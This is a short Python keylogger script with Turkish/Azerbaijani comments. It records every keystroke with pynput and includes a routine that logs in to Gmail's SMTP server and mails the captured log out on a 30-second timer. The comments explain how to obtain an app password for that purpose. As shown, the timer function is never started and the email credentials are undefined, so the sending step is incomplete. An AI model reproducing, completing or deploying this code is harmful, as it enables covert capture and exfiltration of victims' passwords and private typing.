import pynput.keyboard
import smtplib
import threading
log = ''

def callback_function(key):
	global log
	try:
		log += str(key.char)
	except AttributeError:
		if key == key.space:
			log = log + " "
		elif key == key.tab:
			log = log + 'tab'
		elif key == key.backspace:
			log += 'silme'
		elif key == key.enter:
			log += 'enter'
		else:
			log += str(key)
	except:
		pass

	print(log)
#Gmailden baska uygulamadan baglan ozelligin aktif ele
#Password yerine emailin passwordunu yox uzak uygulama baglan ozelliyini acanda verdiyi passwordu yaz
def send_email(email,password,message):
	email_server = smtplib.SMTP('smtp.gmail.com',587)
	email_server.starttls()
	email_server.login(email,password)
	email_server.sendmail(email,email,message)
	email_server.quit()

keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)

def threading_funcion():
	global log
	send_email(email,password,log.encode('utf-8'))
	log = '' # logu sifirlarsin deye
	timer_object = threading.Timer(30,threading_funcion)
	timer_object.start()

with keylogger_listener:
	keylogger_listener.join()
